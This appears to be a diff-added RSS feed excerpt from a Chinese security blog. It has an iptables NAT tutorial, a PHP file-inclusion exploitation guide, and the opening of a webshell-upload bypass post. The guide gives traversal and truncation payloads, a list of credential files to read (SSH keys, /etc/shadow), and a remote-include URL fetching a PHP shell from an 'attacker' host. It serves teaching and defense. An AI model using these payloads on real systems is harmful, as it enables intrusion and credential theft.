+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;[root@iptables ~]# iptables -I INPUT -p tcp -m multiport --dport 80 -j ACCEPT
+[root@iptables ~]# iptables -I INPUT -p tcp -m state --state ESTABLISHED -j ACCEPT
+[root@iptables ~]# iptables -P INPUT DROP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;0x02-iptables防火墙规则的保存与恢复&#34;&gt;0x02 iptables防火墙规则的保存与恢复&lt;/h1&gt;
+&lt;p&gt;1、保存iptables的规则，避免开机失效&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;iptables-save &amp;gt; /etc/iptables 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;2、编辑网卡，写入开机加载iptables规则&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;vi  /etc/network/interfaces
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;3、 在网卡配置文件中写入加载 之前保存的规则文件 使其开机可以加载iptables的规则文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt; iptables-restore &amp;lt; /etc/iptables 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;0x03-snat和dnat&#34;&gt;0x03 SNAT和DNAT&lt;/h1&gt;
+&lt;p&gt;SNAT是指在数据包从网卡发送出去的时候，把数据包中的源地址部分替换为指定的IP，这样，接收方就认为数据包的来源是被替换的那个IP的主机。&lt;/p&gt;
+&lt;p&gt;DNAT就是指数据包从网卡发送出去的时候，修改数据包中的目的IP，表现为如果你想访问A，可是因为网关做了DNAT，把所有访问A的数据包的目的IP全部修改为B，那么，你实际上访问的是B 因为，路由是按照目的地址来选择的。&lt;/p&gt;
+&lt;p&gt;因此DNAT是在PREROUTING链上来进行的，而SNAT是在数据包发送出去的时候才进行，所以是在POSTROUTING链上进行的。 通过SNAT和DNAT可以使内网和外网进行相互通讯。#&lt;/p&gt;
+&lt;p&gt;##SNAT策略概述&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SNAT策略的典型应用环境&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;SNAT策略的典型应用环境&lt;/p&gt;
+&lt;p&gt;​		局域网主机共享单个公网IP地址接入Internet&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;SNAT策略的原理&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;源地址转换&lt;/strong&gt;（Source Network Address Translation）是linux防火墙的一种地址转换操作，也是iptables命令中的一种数据包控制类型，并根据指定条件修改数据包的源IP地址。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;实验环境拓扑：&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;实验分析：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;a：只开启路由转发，未做地址转换的情况：&lt;/p&gt;
+&lt;p&gt;分析：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;从局域网PC机访问Internet的数据包经过网关转发后其源IP地址保持不变；&lt;/li&gt;
+&lt;li&gt;当Internet中的主机收到这样的请求数据包后，响应数据包将无法正确返回，从而导致访问失败。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;b：开启路由转发，并设置SNAT转换的情况：&lt;/p&gt;
+&lt;p&gt;分析：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;局域网PC机访问Internet的数据包到达网关服务器时，会先进行路由选择；&lt;/li&gt;
+&lt;li&gt;如果该数据包需要从外网接口eth0向外转发，则将其源IP地址192.168.10.2修改为网关的外网接口地址210.106.46.151，然后发送给目标主机。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;b访问方式的优点：Internet中的服务器并不知道局域网PC机的实际IP地址，中间的转换完全由网关主机完成，起到了保护内部网络的作用。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;snat策略的应用&#34;&gt;SNAT策略的应用&lt;/h2&gt;
+&lt;p&gt;前提条件：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;局域网各主机正确设置IP地址/子网掩码&lt;/li&gt;
+&lt;li&gt;局域网各主机正确设置默认网关地址&lt;/li&gt;
+&lt;li&gt;Linux网关支持IP路由转发&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;实现方法：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;编写SNAT转换规则&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;SNAT共享固定IP地址上网：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;实验环境描述：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Linux网关服务器两块网卡eth0：210.106.46.151连接Internet、eth1：192.168.10.1连接局域网，开启IP路由功能&lt;/li&gt;
+&lt;li&gt;局域网PC机的默认网关设为192.168.10.1，并设置正确的DNS服务器。&lt;/li&gt;
+&lt;li&gt;内网和外网分别新建客户机，分别指定对应的网关地址，在外网客户机上开启httpd服务，在内网客户机中访问httpd服务，最后查看httpd客户机的访问记录；&lt;/li&gt;
+&lt;li&gt;要求：192.168.10.0/24网段的PC机能够通过共享方式正常访问internet。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;实验步骤：&lt;/p&gt;
+&lt;p&gt;1：打开网关的路由转发（IP转发是实现路由功能的关键所在）：&lt;/p&gt;
+&lt;p&gt;打开路由转发的两种方式：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;永久打开（修改&lt;code&gt;/proc&lt;/code&gt;文件系统中的&lt;code&gt;ip_forward&lt;/code&gt;，当值为1时表示开启，为0表示关闭）：&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;临时开启，临时生效&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;2：正确设置SNAT策略（若要保持SNAT策略长期有效，应将相关命令写入rc.local中）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;[root@localhost ~]# iptables -t nat -A POSTROUTING -s 192.168.10.0/24 -o eth0 -j SNAT --to-source 210.106.46.151
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;	
+  3：测试SNAT共享接入的结果：
+	
+  ​	上诉操作完成后，使用局域网PC就可以正常访问Internet中的网站。
+	
+  ​	对于被访问的网站服务器，在日志文件中将会记录以网关主机210.106.46.151访问。
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;共享动态IP地址上网&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;MASQUERADE —— 地址伪装&lt;/li&gt;
+&lt;li&gt;适用于外网IP地址非固定的情况&lt;/li&gt;
+&lt;li&gt;对于ADSL拨号连接，接口通常为ppp0、ppp1&lt;/li&gt;
+&lt;li&gt;将SNAT规则改为MASQUERADE即可&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;实例：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;[root@localhost ~]# iptables -t nat -A POSTROUTING -s 192.168.10.0/24 -o ppp0 -j MASQUERADE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果网关使用固定的公网IP地址，建议选择SNAT策略而不是MASQUERADE策略，以减少不必要的系统开销。&lt;/p&gt;
+&lt;p&gt;##DNAT策略概述&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DNAT策略的原理：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;目标地址转换&lt;/strong&gt;，Destination Network Address Translation，是Linux防火墙的另一种地址转换操作，也是iptables命令中的一种数据包控制类型，其作用是根据指定条件修改数据包的目标IP地址、目标端口。&lt;/p&gt;
+&lt;p&gt;SNAT用来修改源IP地址，而DNAT用来修改目标IP地址、目标端口；SNAT只能用在NAT表的POSTROUTING链，而DNAT只能用在NAT表的PREROUTING链和OUTPUT链（或被其调用的链）中。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>PHP文件包含介绍及一些利用方式</title>
+      <link>https://p0st3r.github.io/post/php-file-contains/</link>
+      <pubDate>Tue, 11 Apr 2017 00:00:00 +0000</pubDate>
+      <guid>https://p0st3r.github.io/post/php-file-contains/</guid>
+      <description>&lt;h1 id=&#34;文件包含介绍&#34;&gt;文件包含介绍&lt;/h1&gt;
+&lt;p&gt;严格来说，文件包含漏洞是“代码注入“的一种。代码注入的原理就是注入一段用户能控制的脚本或代码，并让服务端执行。&lt;/p&gt;
+&lt;p&gt;代码注入的典型代表就是文件包含。文件包含可能会出现在JSP、PHP、ASP等语言中。&lt;/p&gt;
+&lt;p&gt;常见的导致文件包含的函数如下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;PHP: include(), include_once(), require(),require_once, fopen(), readfile() ….&lt;/li&gt;
+&lt;li&gt;JSP/Servlet: ava.io.File(),java.io.FileReader() …&lt;/li&gt;
+&lt;li&gt;ASP:include file, include virtual…&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;PHP文件包含主要由这四个函数完成：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;include()&lt;/li&gt;
+&lt;li&gt;require()&lt;/li&gt;
+&lt;li&gt;include_once()&lt;/li&gt;
+&lt;li&gt;require_once()&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;当使用这4个函数包含一个新的文件时，&lt;strong&gt;该文件将作为PHP代码执行，PHP内核并不会在意该被包含文件是什么类型&lt;/strong&gt;。所以如果被包含的是txt文件、图片文件、远程URL，也都将作为PHP代码执行。&lt;/p&gt;
+&lt;p&gt;比如DVWA low等级的文件上传&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;include&lt;/span&gt;($_GET[&lt;span style=&#34;color:#a6e22e&#34;&gt;page&lt;/span&gt;]);&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在同目录留一个包含了可执行的PHP代码的txt文件&lt;/p&gt;
+&lt;p&gt;再执行漏洞URL，发现代码被执行了&lt;/p&gt;
+&lt;p&gt;要成功的利用文件包含漏洞，需要满足下面两个条件：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;include（）等函数通过动态变量的方式引入需要包含的文件&lt;/li&gt;
+&lt;li&gt;用户能够控制该动态变量&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;下面我们深入看看文件包含漏洞还能导致哪些后果&lt;/p&gt;
+&lt;h1 id=&#34;本地文件包含&#34;&gt;本地文件包含&lt;/h1&gt;
+&lt;h2 id=&#34;普通本地文件包含&#34;&gt;普通本地文件包含&lt;/h2&gt;
+&lt;p&gt;能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞（Local File Inclusion/LFI）。比如下面这段代码就存在LFI漏洞。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_GET&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;‘file’&lt;/span&gt;];      &lt;span style=&#34;color:#75715e&#34;&gt;// “../../etc/passwd\0
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;file_exisits&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;‘&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;home&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;wwwrun&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;’&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;’&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php’&lt;/span&gt;)) {
+  &lt;span style=&#34;color:#75715e&#34;&gt;//file_exists will return true as the file/home/wwwrun/../../etc/passwd exists  
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;Include&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;‘&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;home&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;wwwrun&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;’&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;’&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php’&lt;/span&gt;;
+  &lt;span style=&#34;color:#75715e&#34;&gt;// the file /etc/passwd will be included
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}
+&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;用户能够控制参数file。当file的值为../../etc/passwd时，PHP将访问/etc/passwd文件。&lt;/p&gt;
+&lt;p&gt;但是在此之前，还需要解决Include‘/home/wwwrun/’.$file.’.php’;&lt;/p&gt;
+&lt;p&gt;这种写法将变量与字符串连接起来，假如用户控制$file的值为../../etc/passwd，这段代码相当于Include‘/home/wwwrun/../../etc/passwd.php’;&lt;/p&gt;
+&lt;p&gt;被包含的文件实际上是/etc/passwd.php，但是实际上这个文件是不存在的&lt;/p&gt;
+&lt;h2 id=&#34;有限制的本地文件包含&#34;&gt;有限制的本地文件包含&lt;/h2&gt;
+&lt;h3 id=&#34;00截断&#34;&gt;%00截断&lt;/h3&gt;
+&lt;p&gt;PHP内核是由C语言实现的，因此使用了C语言中 的一些字符串处理函数。在连接字符串时，0字节（\x00）将作为字符串结束符。所以在这个地方，只要在最后加入一个0字节，就能截断file变量之后的字符串，即&lt;/p&gt;
+&lt;p&gt;../../etc/passwd\0&lt;/p&gt;
+&lt;p&gt;在Web输入时只需URL编码一下，变成&lt;/p&gt;
+&lt;p&gt;../../etc/passwd%00&lt;/p&gt;
+&lt;p&gt;(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)&lt;/p&gt;
+&lt;h3 id=&#34;00截断目录遍历&#34;&gt;%00截断目录遍历&lt;/h3&gt;
+&lt;p&gt;?file=../../../../../../../../../var/www/%00&lt;/p&gt;
+&lt;p&gt;(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)&lt;/p&gt;
+&lt;h3 id=&#34;防御00截断&#34;&gt;防御%00截断&lt;/h3&gt;
+&lt;p&gt;在一般的Web应用中，0字节是用户不需要的，因此可以完全禁用0字节，比如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getVar&lt;/span&gt;($name){
+  &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt;[$name] &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;; 
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;is_string&lt;/span&gt;($value)){
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str_replace&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;“\0”&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;‘&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;‘&lt;/span&gt; , &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;);  
+  }
+}
+&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;构造长目录截断&#34;&gt;构造长目录截断&lt;/h3&gt;
+&lt;p&gt;但是光防御0字节是肯定不够的。俗话说上有政策下有对策，国内的安全研究者cloie发现了一个技巧——利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;目录字符串在Windows下256字节、Linux下4096字节时达到最大值，最大值长度之后的字符将被丢弃。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;而只需通过【./】就可以构造出足够长的目录。比如&lt;/p&gt;
+&lt;p&gt;././././././././././././././././passwd&lt;/p&gt;
+&lt;p&gt;或者&lt;/p&gt;
+&lt;p&gt;////////////////////////passwd&lt;/p&gt;
+&lt;p&gt;又或者&lt;/p&gt;
+&lt;p&gt;../1/abc/../1/abc/../1/abc..&lt;/p&gt;
+&lt;p&gt;(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)&lt;/p&gt;
+&lt;h3 id=&#34;点号截断&#34;&gt;点号截断&lt;/h3&gt;
+&lt;p&gt;?file=../../../../../../../../../boot.ini/………[…]…………&lt;/p&gt;
+&lt;p&gt;(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)&lt;/p&gt;
+&lt;h2 id=&#34;普通远程文件包含&#34;&gt;普通远程文件包含&lt;/h2&gt;
+&lt;p&gt;如果PHP的配置选项allow_url_include为ON的话（默认是关闭的），则include/require函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞（Remote File Inclusion，简称RFI）&lt;/p&gt;
+&lt;p&gt;例如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;($route &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;share&amp;#34;&lt;/span&gt;){
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;require_once&lt;/span&gt; $basePath &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/action/m_share.php&amp;#39;&lt;/span&gt;;
+}
+&lt;span style=&#34;color:#66d9ef&#34;&gt;elseif&lt;/span&gt;($route &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sharelink&amp;#34;&lt;/span&gt;){
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;require_once&lt;/span&gt; $basePath &lt;span style=&#34;color:#f92672&#34;&gt;./&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;action/m_sharelink.php&amp;#39;&lt;/span&gt;;}
+&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在$basePath前没有设置任何障碍，因此攻击者可以构造类似如下的恶意URL：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;/?param=http://attacker/phpshell.txt?
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最终加载的代码实际上执行了：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;require_once &amp;#39;http://attacker/phpshell.txt?/action/m_share.php&amp;#39;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;问号后面的代码最终被解释成URL的querystring（查询用字符串）,这也算一种截断方式，这是利用远程文件包含漏洞时的常见技巧。同样，%00也可以作为截断符号。&lt;/p&gt;
+&lt;h2 id=&#34;本地文件包含的利用技巧&#34;&gt;本地文件包含的利用技巧&lt;/h2&gt;
+&lt;p&gt;本地文件包含漏洞，是有机会执行php代码的，但这取决于一些条件&lt;/p&gt;
+&lt;p&gt;经过不懈研究，安全研究者总结出了一下几种常见的技巧，用于本地文件包含后执行php代码。&lt;/p&gt;
+&lt;p&gt;（1）包含用户上传的文件&lt;/p&gt;
+&lt;p&gt;（2）包含data://或php://input等伪协议&lt;/p&gt;
+&lt;p&gt;（3）包含session文件&lt;/p&gt;
+&lt;p&gt;（4）包含日志文件&lt;/p&gt;
+&lt;p&gt;（5）包含/proc/self/environ&lt;/p&gt;
+&lt;p&gt;（6）包含上传的临时文件&lt;/p&gt;
+&lt;p&gt;（7）包含其他应用创建的文件，如数据库文件，缓存文件，应用日志等，需具体问题具体分析&lt;/p&gt;
+&lt;h3 id=&#34;常见利用方式&#34;&gt;常见利用方式&lt;/h3&gt;
+&lt;?phpinclude(&#34;inc/&#34; . $_GET[&#39;file&#39;]); ?&gt;
+&lt;ul&gt;
+&lt;li&gt;包含同目录下的文件：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;?file=.htaccess&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;目录遍历：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;?file=../../../../../../../../../var/lib/locate.db&lt;/p&gt;
+&lt;p&gt;?file=../../../../../../../../../var/lib/mlocate/mlocate.db&lt;/p&gt;
+&lt;p&gt;（linux中这两个文件储存着所有文件的路径，需要root权限）&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;包含错误日志：?file=../../../../../../../../../var/log/apache/error.log （试试把UA设置为“”来使payload进入日志）&lt;/li&gt;
+&lt;li&gt;获取web目录或者其他配置文件：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;?file=../../../../../../../../../usr/local/apache2/conf/httpd.conf&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;包含上传的附件：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;?file=../attachment/media/xxx.file&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;读取session文件：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7&lt;/p&gt;
+&lt;p&gt;（session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell）&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;如果拥有root权限还可以试试读这些东西：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;/root/.ssh/authorized_keys&lt;/p&gt;
+&lt;p&gt;/root/.ssh/id_rsa&lt;/p&gt;
+&lt;p&gt;/root/.ssh/id_rsa.keystore&lt;/p&gt;
+&lt;p&gt;/root/.ssh/id_rsa.pub&lt;/p&gt;
+&lt;p&gt;/root/.ssh/known_hosts&lt;/p&gt;
+&lt;p&gt;/etc/shadow&lt;/p&gt;
+&lt;p&gt;/root/.bash_history&lt;/p&gt;
+&lt;p&gt;/root/.mysql_history&lt;/p&gt;
+&lt;p&gt;/proc/self/fd/fd[0-9]* (文件标识符)&lt;/p&gt;
+&lt;p&gt;/proc/mounts&lt;/p&gt;
+&lt;p&gt;/proc/config.gz&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;如果有phpinfo可以包含临时文件：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;参考：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;[1]《白帽子讲Web安全》，吴翰清&lt;/p&gt;
+&lt;p&gt;[2]
+&lt;a href=&#34;https://link.zhihu.com/?target=http%3A//blog.csdn.net/wangjian1012/article/details/51581440&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;PHP文件包含漏洞总结 - wangjian1012的博客 - 博客频道 - CSDN.NET&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>木马文件上传防御策略及几种绕过检测方式</title>
+      <link>https://p0st3r.github.io/post/webshell-upload-strategy/</link>
+      <pubDate>Mon, 20 Mar 2017 00:00:00 +0000</pubDate>
+      <guid>https://p0st3r.github.io/post/webshell-upload-strategy/</guid>
+      <description>&lt;h1 id=&#34;0x01-中国菜刀连接&#34;&gt;0x01 中国菜刀连接&lt;/h1&gt;
+&lt;h2 id=&#34;1-webshell&#34;&gt;1. WebShell&lt;/h2&gt;
+&lt;p&gt;WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WE目录下正常的网页文件混在一起，然后就可以使用浏览器或工具来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。&lt;/p&gt;
+&lt;p&gt;通常来说，上传一句话木马通过中国菜刀连接是比较简便地拿到服务器的方法。菜刀可以连接asp、aspx、php、jsp的一句话木马。&lt;/p&gt;
+&lt;h2 id=&#34;2-一句话木马&#34;&gt;2. 一句话木马&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;asp：&lt;/p&gt;
